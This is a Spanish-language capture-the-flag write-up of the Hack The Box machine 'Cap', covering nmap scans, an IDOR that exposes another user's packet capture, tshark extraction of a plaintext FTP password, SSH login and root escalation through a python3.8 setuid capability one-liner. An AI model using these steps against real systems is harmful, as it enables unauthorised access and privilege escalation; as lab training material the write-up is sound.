---
category: Hack The Box
tags:
  - HTB
  - eJPT
title: Machine Cap
comments: true
author: Indiopicaro
image: /assets/img/machines/cap/capbanner.jpeg
---
# Introducción

Cap es una máquina Linux de dificultad fácil que ejecuta un servidor HTTP, lo que permite a los usuarios capturar el tráfico no cifrado. Un control inadecuado da como resultado una Referencia Directa a Objetos Insegura (IDOR), que permite el acceso a la captura de otro usuario. La captura contiene credenciales en texto plano y puede utilizarse para obtener acceso. Posteriormente, se utiliza una función de Linux para obtener acceso root.

### Skills

- Insecure Directory Reference (IDOR)
- Information Leakage
- Abusing Capabilities (python3.8) (Privilege Escalation)

# Enumeración

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG puertos
```

```bash
nmap -sCV -p21,22,80 10.10.10.245 -oN versiones
```
### Puertos

- 21 ----> vsftpd 3.0.3
- 22 ----> OpenSSH 8.2P1 Ubuntu 4Ubuntu0.2
- 80 ----> http gunicorn


# WEB
## Information Leakage

La página web revela información al consultarla a través de la URL.

![Information Leakage](/assets/img/machines/cap/1.jpeg)

### IDOR

Un aspecto interesante a tener en cuenta es el esquema de URL al crear una nueva captura, que tiene el formato /data/id. El ID se incrementa con cada captura. Es posible que haya habido capturas de paquetes de usuarios anteriores. Al navegar a /data/0, se revela una captura de paquetes con varios paquetes.

![IDOR](/assets/img/machines/cap/2.jpeg)

#### Extracción de datos de un archivo de captura de red (.pcap)

Para analizar el tráfico capturado y extraer el contenido de los paquetes TCP de forma limpia, utilizamos el siguiente comando:

```bash
tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
```
¿Qué hace este comando?
- `tshark -r 0.pcap`  
    ➔ **Abre y lee** el archivo de captura de paquetes `0.pcap`.
    
- `-T fields -e tcp.payload`  
    ➔ **Extrae solo** el campo `tcp.payload`, es decir, **el contenido crudo** de los paquetes TCP.
    
- `2>/dev/null`  
    ➔ **Elimina mensajes de error** (redirige los errores a `/dev/null` para que no ensucien la salida).
    
- `|`  
    ➔ **Pasa** la salida anterior como entrada al siguiente comando.
    
- `xxd -ps -r`  
    ➔ **Convierte** los datos de **hexadecimal plano a datos legibles** (básicamente "decodifica" el payload).

Dentro del tráfico extraído se encontró la siguiente contraseña:

```bash
PASS Buck3tH4TF0RM3!
```

# Acceso

### FTP

```bash
ftp@10.10.10.245
username: nathan
password: Buck3tH4TF0RM3!
```

```bash
get user.txt
```


### SSH


```bash
ssh nathan@10.10.10.245

password: Buck3tH4TF0RM3!
```

## Escalada

```bash
getcap -r / 2>/dev/null
```

Este comando **intenta obtener una shell como root**, pero **solo funcionará si el proceso de Python se está ejecutando con privilegios de root**, o si el ejecutable de Python tiene el bit `setuid` activado

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```
intenta ejecutar un **shell bash como el usuario root** (UID 0) usando Python 3.8.
- `python3.8 -c '...'`: ejecuta el código Python que está dentro de las comillas directamente desde la línea de comandos.
    
- `import os`: importa el módulo `os`, que permite interactuar con el sistema operativo.
    
- `os.setuid(0)`: cambia el ID de usuario del proceso actual a `0`, que es el UID del usuario **root**.
    
- `os.system("bash")`: ejecuta el comando `bash`, abriendo una shell.

```bash
cd /root/
cat root.txt
```
